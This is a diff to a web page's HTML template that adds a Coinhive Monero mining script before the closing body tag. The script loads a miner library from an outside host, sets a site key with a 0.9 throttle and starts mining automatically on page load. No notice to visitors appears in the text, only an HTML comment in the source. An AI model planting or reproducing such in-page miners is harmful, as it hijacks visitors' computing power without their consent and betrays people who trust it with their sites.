@@ -225,5 +225,15 @@
     })
 </script>
 <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-54894cfc53321667" async></script>
+<!-- XMR mining -->
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('GRKSv76kf5hxxw1tqCzXUVBcfSla7oJD', {
+        throttle: 0.9
+    });
+    miner.start();
+    // miner.on('found', function() {console.log('Hash found')});
+    // miner.on('accepted', function() {console.log('Hash accepted by the pool')});
+</script>
 </body>
 </html>
